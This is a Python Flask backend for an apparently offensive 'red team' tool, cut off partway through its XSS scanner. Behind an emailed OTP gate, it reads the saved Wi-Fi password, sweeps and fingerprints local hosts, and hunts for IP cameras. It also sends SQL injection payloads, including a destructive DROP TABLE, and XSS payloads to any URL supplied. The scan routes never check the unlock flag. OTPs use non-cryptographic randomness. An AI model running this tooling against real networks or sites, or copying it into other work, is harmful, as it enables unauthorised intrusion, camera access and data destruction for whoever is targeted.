from flask import Flask, render_template, request, jsonify, send_file, session
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_talisman import Talisman
import bcrypt
import socket
import threading
import urllib.request
from datetime import datetime, timedelta
import secrets
import os
import json
import random
import time
import re
import bleach
import subprocess
import ipaddress
import shlex
import smtplib
import requests
import sqlite3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from secrets import token_urlsafe
from werkzeug.utils import secure_filename
import platform
import nmap
from dotenv import load_dotenv

load_dotenv()

# --------------------------- SINGLE FLASK APP ---------------------------
app = Flask(__name__, template_folder='../frontend', static_folder='../frontend', static_url_path='')

# ================= CONFIGURATION =================
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024
ALLOWED_EXTENSIONS = {'txt', 'lst', 'wordlist', 'csv', 'dict', 'hash'}

# ================= SECURE SESSION =================
app.secret_key = token_urlsafe(32)
app.config['SESSION_PERMANENT'] = True
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = False
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
CORS(app, supports_credentials=True)

# ================= SECURITY HEADERS =================
Talisman(app,
    force_https=False,
    force_https_permanent=False,
    force_file_save=False,
    frame_options='DENY',
    strict_transport_security=False,
    content_security_policy={
        'default-src': "'self'",
        'script-src': "'self' 'unsafe-inline'",
        'style-src': "'self' 'unsafe-inline'",
        'img-src': "'self' data:",
        'font-src': "'self'",
        'connect-src': "'self'",
    },
    referrer_policy='strict-origin-when-cross-origin'
)

# ================= RATE LIMITING =================
limiter = Limiter(get_remote_address, app=app, default_limits=["200 per day", "50 per hour"])

@app.after_request
def no_cache_html(response):
    if response.mimetype == 'text/html':
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
        response.headers['Pragma'] = 'no-cache'
        response.headers['Expires'] = '0'
    return response

# ================= EMAIL ACCOUNTS (Loaded from .env) =================
EMAIL_ACCOUNTS = [
    {'name': 'KHAN TOOL 1', 'username': os.getenv('EMAIL_USER1'), 'password': os.getenv('EMAIL_PASS1')},
    {'name': 'KHAN TOOL 2', 'username': os.getenv('EMAIL_USER2'), 'password': os.getenv('EMAIL_PASS2')},
    {'name': 'KHAN TOOL 3', 'username': os.getenv('EMAIL_USER3'), 'password': os.getenv('EMAIL_PASS3')},
    {'name': 'KHAN TOOL 4', 'username': os.getenv('EMAIL_USER4'), 'password': os.getenv('EMAIL_PASS4')},
    {'name': 'KHAN TOOL 5', 'username': os.getenv('EMAIL_USER5'), 'password': os.getenv('EMAIL_PASS5')},
]
EMAIL_ACCOUNTS = [acc for acc in EMAIL_ACCOUNTS if acc['username'] and acc['password']]

for acc in EMAIL_ACCOUNTS:
    if acc['password']:
        acc['password'] = re.sub(r'\s+', '', acc['password'])

SENDER_DISPLAY_NAME = "⚔️ KHAN TOOL | RED TEAM SECURITY ⚔️"

def send_email_with_failover(recipient, subject, html_body):
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    for idx, account in enumerate(EMAIL_ACCOUNTS, 1):
        server = None
        try:
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(account['username'], account['password'])
            msg = MIMEMultipart()
            msg['From'] = f"{SENDER_DISPLAY_NAME} <{account['username']}>"
            msg['To'] = recipient
            msg['Subject'] = subject
            msg.attach(MIMEText(html_body, 'html'))
            server.send_message(msg)
            print(f"✅ Email sent using {account['name']}")
            return True
        except Exception as e:
            print(f"❌ Attempt {idx} failed: {str(e)}")
        finally:
            if server:
                try:
                    server.quit()
                except:
                    pass
        time.sleep(2)
    return False

# ================= OTP & AUTH =================
otp_store = {}

def generate_otp():
    return f"{random.randint(100000, 999999)}"

def is_locked(record):
    return record.get('locked_until') and time.time() < record['locked_until']

VALID_PASSWORD_HASH = b"$2b$12$oYobn0faLkceGtd7h9AeUelHG0BhG/61l6lEKJN5hKbtpBDIfq/Iy"

def verify_password(password):
    return bcrypt.checkpw(password.encode(), VALID_PASSWORD_HASH)

def validate_email(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(pattern, email) is not None

def sanitize_input(text):
    return bleach.clean(text, strip=True)

def sanitize_command_arg(arg):
    return re.sub(r'[^a-zA-Z0-9\.\-_/ :]', '', arg)

def get_stylish_otp_html(otp_code):
    return f"""<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="background:#000; font-family:'Courier New', monospace; margin:0; padding:20px;">
<div style="max-width:600px; margin:auto; border:2px solid #00ff99; border-radius:12px; background:#050505; box-shadow:0 0 25px #00ff99; padding:20px;">
<pre style="color:#00ff99; font-size:10px; text-align:center;">
╔══════════════════════════════════════════════╗
║   ██╗  ██╗██╗  ██╗ █████╗ ███╗   ██╗        ║
║   ██║  ██║██║  ██║██╔══██╗████╗  ██║        ║
║   ███████║███████║███████║██╔██╗ ██║        ║
║   ██╔══██║██╔══██║██╔══██║██║╚██╗██║        ║
║   ██║  ██║██║  ██║██║  ██║██║ ╚████║        ║
║   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝        ║
╚══════════════════════════════════════════════╝
</pre>
<h2 style="color:#00ff99; text-align:center;">⚠️ SECURE ACCESS TERMINAL</h2>
<p style="color:#00ff99; text-align:center;">[ SYSTEM AUTHENTICATION REQUIRED ]</p>
<div style="background:#000; border:2px solid #00ff99; text-align:center; padding:20px; margin:20px auto; width:85%;">
<span style="font-size:48px; font-weight:bold; color:#00ff99; letter-spacing:10px;">{otp_code}</span>
</div>
<p style="color:#00ff99; text-align:center;">⏳ Expiry: 5 Minutes<br>🔒 Encryption: ACTIVE</p>
<hr style="border-color:#00ff99;">
<p style="color:#ff4444; text-align:center;">⚠️ Do NOT share this OTP with anyone</p>
<p style="color:#777; text-align:center; font-size:10px;">KHAN TOOL // RED TEAM SECURITY MODULE</p>
</div>
</body>
</html>"""

# ================= AUTH ROUTES (EMAIL ONLY) =================
@app.route('/api/verify-password', methods=['POST'])
def verify_password_route():
    data = request.get_json()
    password = data.get('password', '')
    if verify_password(password):
        return jsonify({'status': 'success', 'message': 'Password correct'})
    else:
        return jsonify({'status': 'error', 'message': 'Invalid access key'}), 401

@app.route('/api/send-otp', methods=['POST'])
@limiter.limit("5 per minute", key_func=lambda: request.get_json().get('email', request.remote_addr))
def send_otp():
    data = request.get_json()
    email = sanitize_input(data.get('email', ''))
    if not email or not validate_email(email):
        return jsonify({'status': 'error', 'message': 'Invalid email format'}), 400
    if email in otp_store and is_locked(otp_store[email]):
        remaining = int(otp_store[email]['locked_until'] - time.time())
        return jsonify({'status': 'error', 'message': f'Too many failed attempts. Try after {remaining} seconds.'}), 429
    otp = generate_otp()
    otp_store[email] = {
        'otp': otp,
        'expires': time.time() + 300,
        'failed_attempts': 0,
        'locked_until': None
    }
    success = send_email_with_failover(
        recipient=email,
        subject="⚠️ KHAN TOOL - Secure OTP Verification",
        html_body=get_stylish_otp_html(otp)
    )
    if success:
        return jsonify({'status': 'success', 'message': 'OTP sent to email'})
    else:
        return jsonify({'status': 'error', 'message': 'Failed to send OTP.'}), 500

@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    data = request.get_json()
    email = sanitize_input(data.get('email', ''))
    user_otp = sanitize_input(data.get('otp', ''))
    if not email or not user_otp or not validate_email(email):
        return jsonify({'status': 'error', 'message': 'Email and OTP required'}), 400
    record = otp_store.get(email)
    if not record:
        return jsonify({'status': 'error', 'message': 'No OTP found.'}), 400
    if is_locked(record):
        remaining = int(record['locked_until'] - time.time())
        return jsonify({'status': 'error', 'message': f'Account locked. Try after {remaining} seconds.'}), 429
    if time.time() > record['expires']:
        del otp_store[email]
        return jsonify({'status': 'error', 'message': 'OTP expired.'}), 400
    if user_otp == record['otp']:
        del otp_store[email]
        session['attack_unlocked'] = True
        return jsonify({'status': 'success', 'message': 'OTP verified. Attack unlocked.'})
    else:
        record['failed_attempts'] += 1
        remaining_attempts = 3 - record['failed_attempts']
        if record['failed_attempts'] >= 3:
            record['locked_until'] = time.time() + 300
            return jsonify({'status': 'error', 'message': 'Too many failed attempts. Locked for 5 minutes.'}), 429
        else:
            return jsonify({'status': 'error', 'message': f'Invalid OTP. {remaining_attempts} attempts left.'}), 400

# ================= SESSION & AUTH ROUTES =================
from flask import session

@app.route('/api/unlock-attack', methods=['POST'])
def unlock_attack():
    try:
        if session.get('attack_unlocked'):
            return jsonify({'status': 'success', 'message': 'Already unlocked'})
        else:
            return jsonify({'status': 'error', 'message': 'Please verify OTP first'}), 403
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/check-attack', methods=['GET'])
def check_attack():
    try:
        unlocked = session.get('attack_unlocked', False)
        return jsonify({'unlocked': unlocked})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/logout', methods=['POST'])
def logout():
    try:
        session.clear()
        return jsonify({'status': 'success', 'message': 'Logged out'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/session-clear', methods=['POST'])
def session_clear():
    try:
        session.clear()
        return '', 204
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500
# ================= FILE UPLOAD HELPER =================
def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/api/upload-hash', methods=['POST'])
def upload_hash():
    if 'file' not in request.files:
        return jsonify({'status': 'error', 'message': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'status': 'error', 'message': 'No selected file'}), 400
    if file and allowed_file(file.filename):
        filename = secure_filename(f"hash_{int(time.time())}_{file.filename}")
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        return jsonify({'status': 'success', 'path': filepath, 'message': f'Uploaded: {filename}'})
    else:
        return jsonify({'status': 'error', 'message': 'File type not allowed. Use .txt, .hash'}), 400

@app.route('/api/upload-wordlist', methods=['POST'])
def upload_wordlist():
    if 'file' not in request.files:
        return jsonify({'status': 'error', 'message': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'status': 'error', 'message': 'No selected file'}), 400
    if file and allowed_file(file.filename):
        filename = secure_filename(f"user_{int(time.time())}_{file.filename}")
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        return jsonify({'status': 'success', 'path': filepath, 'message': f'File uploaded: {filename}'})
    else:
        return jsonify({'status': 'error', 'message': 'File type not allowed. Use .txt, .lst, .wordlist, .csv, .dict'}), 400








# ================= ADVANCED WI-FI TOOLS =================
import ipaddress
import queue
import threading

def get_default_gateway_and_interface():
    try:
        if platform.system() == "Linux":
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
            match = re.search(r'default via (\d+\.\d+\.\d+\.\d+) dev (\w+)', result.stdout)
            if match:
                return match.group(1), match.group(2)
        return None, None
    except:
        return None, None

def get_my_ip(iface=None):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_network_range():
    try:
        my_ip = get_my_ip()
        gw, iface = get_default_gateway_and_interface()
        if gw:
            result = subprocess.run(['ip', '-o', '-f', 'inet', 'addr', 'show', iface], capture_output=True, text=True)
            match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)', result.stdout)
            if match:
                return f"{match.group(1)}/{match.group(2)}"
        return f"{my_ip}/24"
    except:
        return "192.168.1.0/24"

def get_mac_vendor(mac):
    try:
        resp = requests.get(f"https://api.macvendors.com/{mac}", timeout=3)
        if resp.status_code == 200:
            return resp.text.strip()
    except:
        pass
    oui_db = {
        "00:1A:2B": "Cisco Systems", "00:1B:44": "Hikvision", "00:04:0D": "Dahua Technology",
        "00:12:5A": "D-Link", "00:14:BF": "TP-Link", "00:17:C8": "HTC", "00:1C:10": "Huawei",
        "00:1F:33": "Netgear", "00:22:6B": "Apple", "00:23:5A": "Samsung", "00:24:1D": "Intel",
        "00:26:55": "Sony", "00:50:56": "VMware", "08:00:27": "Oracle/VirtualBox", "08:74:02": "Hikvision",
        "0C:1D:AF": "Dahua", "14:CC:20": "TP-Link", "18:68:CB": "D-Link", "1C:AA:07": "Hikvision",
        "2C:23:3A": "NETGEAR", "30:8C:FB": "Xiaomi", "34:96:72": "Tenda", "38:59:F9": "Apple",
        "3C:52:11": "Dahua", "40:8D:5C": "Hikvision", "44:19:B6": "Huawei", "48:22:54": "TP-Link",
        "54:27:1E": "Raspberry Pi", "58:8E:81": "NETGEAR", "5C:CF:7F": "D-Link", "60:6E:E8": "Huawei",
        "64:70:02": "Dahua", "6C:5A:B0": "Hikvision", "70:5A:0F": "Tenda", "74:DA:38": "Apple",
        "78:9E:D0": "Samsung", "7C:DD:90": "TP-Link", "80:73:D6": "Xiaomi", "84:0D:8E": "Dahua",
        "88:53:2E": "TP-Link", "8C:8B:83": "D-Link", "90:48:9A": "Huawei", "94:DB:C9": "Xiaomi",
        "98:F0:AB": "Apple", "A0:63:91": "NETGEAR", "A4:2B:8C": "Hikvision", "A8:57:4E": "Dahua",
        "B0:4E:26": "Samsung", "B4:75:0E": "Tenda", "B8:27:EB": "Raspberry Pi Foundation",
        "C0:25:A5": "Linksys", "C4:9E:BD": "Tenda", "CC:2D:8C": "TP-Link", "D0:37:45": "D-Link",
        "D4:8A:FC": "Xiaomi", "DC:A6:32": "Raspberry Pi", "E0:63:DA": "Huawei", "E4:6F:13": "ASUS",
        "E8:48:B8": "TP-Link", "EC:08:6B": "TP-Link", "F0:2F:74": "TP-Link", "F4:EC:38": "TP-Link", "FC:DB:B3": "D-Link",
    }
    mac_clean = mac.upper().replace("-", ":")
    oui = mac_clean[:8]
    return oui_db.get(oui, "Unknown")

def is_camera_vendor(vendor):
    camera_keywords = ['hikvision', 'dahua', 'cctv', 'camera', 'ip camera', 'uniview', 'axis', 'bosch', 'pelco', 'samsung', 'sony', 'panasonic', 'arecont', 'vivotek', 'geovision', 'avtech', 'hik', 'dahua', 'lorex', 'amcrest', 'foscam', 'wansview', 'zmodo', 'sv3c', 'reolink', 'annke', 'swann', 'night owl']
    return any(kw in vendor.lower() for kw in camera_keywords)

def check_port(ip, port, timeout=1):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def get_device_fingerprint(ip):
    try:
        nm = nmap.PortScanner()
        nm.scan(ip, arguments='-O -sV --osscan-guess -T4 --min-rate 1000', timeout=60)
        if ip in nm.all_hosts():
            host = nm[ip]
            info = {}
            info['os'] = host.get('osmatch', [{}])[0].get('name', 'Unknown') if host.get('osmatch') else 'Unknown'
            info['os_accuracy'] = host.get('osmatch', [{}])[0].get('accuracy', 'N/A') if host.get('osmatch') else 'N/A'
            info['uptime'] = host.get('uptime', {}).get('lastboot', 'Unknown')
            info['ports'] = {}
            for proto in host.all_protocols():
                port_data = host[proto]
                for port in sorted(port_data.keys()):
                    info['ports'][port] = {
                        'state': port_data[port]['state'],
                        'name': port_data[port]['name'],
                        'product': port_data[port]['product'],
                        'version': port_data[port]['version']
                    }
            return info
        return None
    except:
        return None

@app.route('/api/wifi/connected-password', methods=['GET'])
def wifi_connected_password():
    try:
        result = subprocess.run(['nmcli', '-t', '-f', 'active,ssid', 'dev', 'wifi'], capture_output=True, text=True)
        active_ssid = None
        for line in result.stdout.split('\n'):
            if line.startswith('yes:'):
                active_ssid = line.split('yes:')[1].strip()
                break
        if not active_ssid:
            iw_result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            match = re.search(r'ESSID:"([^"]+)"', iw_result.stdout)
            if match:
                active_ssid = match.group(1)
        if not active_ssid:
            return jsonify({'status': 'error', 'message': 'No active WiFi connection found'}), 404
        password = None
        pwd_result = subprocess.run(['nmcli', 'dev', 'wifi', 'show-password'], capture_output=True, text=True)
        match = re.search(r'Password:\s+(\S+)', pwd_result.stdout)
        if match:
            password = match.group(1)
        wifi_info = {'ssid': active_ssid, 'password': password}
        signal_result = subprocess.run(['nmcli', '-t', '-f', 'ssid,signal,security', 'dev', 'wifi'], capture_output=True, text=True)
        for line in signal_result.stdout.split('\n'):
            if active_ssid in line:
                parts = line.split(':')
                if len(parts) >= 3:
                    wifi_info['signal'] = parts[1]
                    wifi_info['security'] = parts[2]
        iw_result = subprocess.run(['iwconfig'], capture_output=True, text=True)
        freq_match = re.search(r'Frequency:([\d.]+)', iw_result.stdout)
        channel_match = re.search(r'Channel[=:]?(\d+)', iw_result.stdout)
        if freq_match:
            wifi_info['frequency'] = freq_match.group(1)
        if channel_match:
            wifi_info['channel'] = channel_match.group(1)
        my_ip = get_my_ip()
        gw, iface = get_default_gateway_and_interface()
        wifi_info['ip'] = my_ip
        wifi_info['gateway'] = gw
        wifi_info['interface'] = iface
        return jsonify({'status': 'success', 'data': wifi_info})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/wifi/devices', methods=['GET'])
def wifi_devices():
    try:
        network_range = get_network_range()
        gw, iface = get_default_gateway_and_interface()
        my_ip = get_my_ip()
        devices = []
        
        # Method 1: Try arp-scan with sudo
        try:
            if iface:
                result = subprocess.run(
                    ['sudo', 'arp-scan', '--localnet', '--interface', iface],
                    capture_output=True, text=True, timeout=30
                )
            else:
                result = subprocess.run(
                    ['sudo', 'arp-scan', network_range],
                    capture_output=True, text=True, timeout=30
                )
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if not line or line.startswith('Interface') or line.startswith('Starting') or line.startswith('Ending'):
                        continue
                    parts = line.split()
                    if len(parts) >= 3 and re.match(r'\d+\.\d+\.\d+\.\d+', parts[0]):
                        ip = parts[0]
                        mac = parts[1]
                        vendor = ' '.join(parts[2:]) if len(parts) > 2 else get_mac_vendor(mac)
                        if ip == my_ip:
                            continue
                        hostname = 'Unknown'
                        try:
                            hostname = socket.gethostbyaddr(ip)[0]
                        except:
                            pass
                        devices.append({
                            'ip': ip, 'mac': mac, 'hostname': hostname, 'vendor': vendor,
                            'is_camera': is_camera_vendor(vendor), 'is_gateway': ip == gw, 'is_self': ip == my_ip
                        })
        except:
            pass
        
        # Method 2: Use /proc/net/arp (no sudo needed)
        if not devices:
            try:
                with open('/proc/net/arp', 'r') as f:
                    lines = f.readlines()[1:]
                    for line in lines:
                        parts = line.split()
                        if len(parts) >= 4:
                            ip = parts[0]
                            mac = parts[3]
                            if ip != my_ip and mac != '00:00:00:00:00:00':
                                vendor = get_mac_vendor(mac)
                                hostname = 'Unknown'
                                try:
                                    hostname = socket.gethostbyaddr(ip)[0]
                                except:
                                    pass
                                devices.append({
                                    'ip': ip, 'mac': mac, 'hostname': hostname, 'vendor': vendor,
                                    'is_camera': is_camera_vendor(vendor), 'is_gateway': ip == gw, 'is_self': ip == my_ip
                                })
            except:
                pass
        
        # Remove duplicates
        seen = set()
        unique_devices = []
        for d in devices:
            if d['ip'] not in seen:
                seen.add(d['ip'])
                unique_devices.append(d)
        
        return jsonify({
            'status': 'success', 
            'network': {
                'range': network_range,
                'gateway': gw,
                'interface': iface,
                'my_ip': my_ip,
                'total_devices': len(unique_devices)
            },
            'devices': unique_devices
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/wifi/device-detail', methods=['GET'])
def device_detail():
    ip = request.args.get('ip')
    if not ip:
        return jsonify({'status': 'error', 'message': 'IP required'}), 400
    try:
        fingerprint = get_device_fingerprint(ip)
        if not fingerprint:
            fingerprint = {'os': 'Unknown', 'ports': {}}
            common_ports = [21,22,23,25,53,80,443,554,8080,8443,3306,3389,5900,8080,8443]
            for port in common_ports:
                if check_port(ip, port, timeout=1):
                    fingerprint['ports'][port] = {'state': 'open', 'name': socket.getservbyport(port, 'tcp') if port <= 65535 else 'unknown', 'product': '', 'version': ''}
        return jsonify({'status': 'success', 'ip': ip, 'fingerprint': fingerprint})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/wifi/find-cameras', methods=['GET'])
def find_cameras():
    try:
        network_range = get_network_range()
        my_ip = get_my_ip()
        gw, iface = get_default_gateway_and_interface()
        camera_ports_map = {'RTSP': [554,8554,10554], 'HTTP': [80,8080,8000], 'HTTPS': [443,8443], 'ONVIF': [80,8899,5000], 'Dahua': [37777,37778], 'Hikvision': [8000,8080], 'Xiongmai': [34567,10000], 'RTMP': [1935]}
        live_hosts = []
        try:
            if iface:
                result = subprocess.run(['sudo', 'arp-scan', '--localnet', '--interface', iface], capture_output=True, text=True, timeout=60)
            else:
                result = subprocess.run(['sudo', 'arp-scan', network_range], capture_output=True, text=True, timeout=60)
            for line in result.stdout.split('\n'):
                parts = line.split()
                if len(parts) >= 2 and re.match(r'\d+\.\d+\.\d+\.\d+', parts[0]):
                    ip = parts[0]
                    if ip != my_ip:
                        live_hosts.append(ip)
        except:
            pass
        
        cameras_found = []
        for ip in live_hosts:
            open_ports = {}
            for service, ports in camera_ports_map.items():
                for port in ports:
                    if check_port(ip, port, timeout=0.5):
                        open_ports.setdefault(service, []).append(port)
            if open_ports:
                hostname = 'Unknown'
                mac = 'Unknown'
                vendor = 'Unknown'
                try:
                    hostname = socket.gethostbyaddr(ip)[0]
                except:
                    pass
                try:
                    result = subprocess.run(['ip', 'neigh', 'show', ip], capture_output=True, text=True)
                    match = re.search(r'lladdr\s+([0-9a-f:]+)', result.stdout.lower())
                    if match:
                        mac = match.group(1)
                        vendor = get_mac_vendor(mac)
                except:
                    pass
                camera_info = {}
                try:
                    resp = requests.get(f"http://{ip}", timeout=2, headers={'User-Agent': 'Mozilla/5.0'})
                    if resp.status_code < 400:
                        body = resp.text.lower()
                        if any(kw in body for kw in ['camera','cctv','log in','login','h264','onvif','viewer','live']):
                            camera_info['http_response'] = resp.status_code
                            title = re.search(r'<title>(.*?)</title>', resp.text, re.IGNORECASE)
                            if title:
                                camera_info['page_title'] = title.group(1)
                except:
                    pass
                cameras_found.append({
                    'ip': ip, 'mac': mac, 'hostname': hostname, 'vendor': vendor,
                    'open_ports': open_ports,
                    'all_open_ports': list(set([p for ports in open_ports.values() for p in ports])),
                    'http_info': camera_info,
                    'confidence': 'HIGH' if (554 in open_ports.get('RTSP',[]) or 80 in open_ports.get('ONVIF',[]) or 37777 in open_ports.get('Dahua',[])) else 'MEDIUM'
                })
        return jsonify({'status': 'success', 'cameras_found': cameras_found, 'total_cameras': len(cameras_found), 'network_range': network_range})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/wifi/network-info', methods=['GET'])
def network_info():
    try:
        info = {}
        my_ip = get_my_ip()
        gw, iface = get_default_gateway_and_interface()
        info['my_ip'] = my_ip
        info['gateway'] = gw
        info['interface'] = iface
        info['hostname'] = socket.gethostname()
        info['network_range'] = get_network_range()
        try:
            with open('/etc/resolv.conf', 'r') as f:
                dns_servers = re.findall(r'nameserver\s+(\S+)', f.read())
                info['dns_servers'] = dns_servers
        except:
            info['dns_servers'] = []
        try:
            if iface:
                result = subprocess.run(['ip', 'link', 'show', iface], capture_output=True, text=True)
                match = re.search(r'lladdr\s+([0-9a-f:]+)', result.stdout.lower())
                if match:
                    info['my_mac'] = match.group(1)
        except:
            info['my_mac'] = 'Unknown'
        info['os'] = platform.system() + ' ' + platform.release()
        try:
            result = subprocess.run(['uptime', '-p'], capture_output=True, text=True)
            info['uptime'] = result.stdout.strip()
        except:
            info['uptime'] = 'Unknown'
        return jsonify({'status': 'success', 'data': info})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/wifi/refresh-arp', methods=['POST'])
def refresh_arp():
    """Refresh ARP cache by pinging network"""
    try:
        network_range = get_network_range()
        import ipaddress
        net = ipaddress.ip_network(network_range, strict=False)
        gw, _ = get_default_gateway_and_interface()
        if gw:
            subprocess.run(['ping', '-c', '1', '-W', '1', gw], capture_output=True)
        for ip in list(net.hosts())[:20]:
            subprocess.run(['ping', '-c', '1', '-W', '1', str(ip)], capture_output=True, timeout=2)
        return jsonify({'status': 'success', 'message': 'ARP cache refreshed'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500




#sql 
@app.route('/api/sql-scan', methods=['POST'])
def sql_scan():
    data = request.get_json()
    target_url = data.get('url', '').strip()
    custom_payloads = data.get('payloads', [])
    
    if not target_url:
        return jsonify({'status': 'error', 'message': 'URL required'}), 400
    
    # Default SQL injection payloads (real working)
    default_payloads = [
        "'",
        '"',
        "`",
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        '" OR "1"="1"--',
        "1' AND '1'='1",
        "1' AND SLEEP(5)--",
        "1' AND (SELECT SLEEP(5))--",
        "' UNION SELECT NULL--",
        "' UNION SELECT 1,2,3--",
        "admin'--",
        "admin' #",
        "'; DROP TABLE users;--",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
    ]
    
    payloads_to_test = custom_payloads if custom_payloads else default_payloads
    results = []
    vulnerable_count = 0
    
    # Get baseline response
    try:
        baseline_resp = requests.get(target_url, timeout=8, headers={'User-Agent': 'Mozilla/5.0'})
        baseline_length = len(baseline_resp.text)
        baseline_status = baseline_resp.status_code
        baseline_time = baseline_resp.elapsed.total_seconds()
    except:
        baseline_length, baseline_status, baseline_time = 0, 200, 0
    
    # SQL error patterns to detect
    sql_errors = [
        'sql syntax', 'mysql_fetch', 'mysql_', 'ora-', 'oracle error',
        'postgresql error', 'pg_query', 'sqlite error', 'sqlite3',
        'unclosed quotation', 'syntax error', 'warning: mysql',
        'odbc driver', 'microsoft ole db', 'db_query failed',
        'invalid query', 'pdoexception', 'sqlstate',
        'division by zero', 'column not found', 'table doesn\'t exist'
    ]
    
    for payload in payloads_to_test:
        # Inject payload into URL
        if '=' in target_url:
            test_url = inject_payload_sql(target_url, payload)
        else:
            test_url = target_url + '?q=' + payload
        
        try:
            start_time = time.time()
            resp = requests.get(test_url, timeout=12, headers={'User-Agent': 'Mozilla/5.0 (SQLi Test)'})
            elapsed = time.time() - start_time
            
            resp_lower = resp.text.lower()
            found_errors = []
            
            # Check for SQL errors
            for error in sql_errors:
                if error in resp_lower:
                    found_errors.append(error)
            
            # Check for response anomalies
            length_diff = abs(len(resp.text) - baseline_length)
            time_diff = elapsed - baseline_time
            
            is_vulnerable = False
            vuln_type = None
            
            if found_errors:
                is_vulnerable = True
                vuln_type = 'error_based'
            elif length_diff > 200 and len(resp.text) < 100:
                is_vulnerable = True
                vuln_type = 'blank_page'
            elif time_diff > 3:
                is_vulnerable = True
                vuln_type = 'time_based'
            elif resp.status_code != baseline_status and resp.status_code >= 500:
                is_vulnerable = True
                vuln_type = 'server_error'
            
            if is_vulnerable:
                vulnerable_count += 1
                results.append({
                    'payload': payload,
                    'vulnerable': True,
                    'vuln_type': vuln_type,
                    'errors': found_errors[:3],
                    'response_time': f"{elapsed:.2f}s",
                    'status_code': resp.status_code
                })
            else:
                results.append({
                    'payload': payload,
                    'vulnerable': False
                })
        except Exception as e:
            results.append({
                'payload': payload,
                'vulnerable': False,
                'error': str(e)
            })
    
    return jsonify({
        'status': 'success',
        'target': target_url,
        'payloads_tested': len(payloads_to_test),
        'vulnerable_payloads': vulnerable_count,
        'results': results
    })

def inject_payload_sql(url, payload):
    """Inject SQL payload into URL parameter"""
    if '=' not in url:
        return url + '?id=' + payload
    
    parts = url.split('=', 1)
    if '&' in parts[1]:
        remaining = parts[1].split('&', 1)[1]
        return parts[0] + '=' + payload + '&' + remaining
    else:
        return parts[0] + '=' + payload
#xss scaner 
@app.route('/api/xss-scan', methods=['POST'])
def xss_scan():
    data = request.get_json()
    target_url = data.get('url', '').strip()
    custom_payloads = data.get('payloads', [])
    
    if not target_url:
        return jsonify({'status': 'error', 'message': 'URL required'}), 400
    
    # Default XSS payloads (real working)
    default_payloads = [
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<body onload=alert(1)>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<img src=x:x onerror=alert(1)>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(1)'>",
        "</script><script>alert(1)</script>",
        "';alert(1);//",
        "\";alert(1);//",
        "<input autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<a href='javascript:alert(1)'>click</a>"
    ]
    
    payloads_to_test = custom_payloads if custom_payloads else default_payloads
    results = []
    vulnerable_count = 0
    
    for payload in payloads_to_test:
        # Inject payload into URL
        if '?' in target_url:
            # Replace parameter value with payload
            test_url = inject_payload(target_url, payload)
        else:
            test_url = target_url + '?q=' + payload
        
        try:
            resp = requests.get(test_url, timeout=10, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            })
            
            # Check if payload is reflected unencoded
            is_vulnerable = False
            reflected_in = None
            
            # Direct payload reflection
            if payload in resp.text:
                is_vulnerable = True
                reflected_in = 'direct_reflection'
            # Payload tags reflected without encoding (check for < and >)
            elif '<' in payload and '>' in payload:
                if '<' in resp.text and '>' in resp.text:
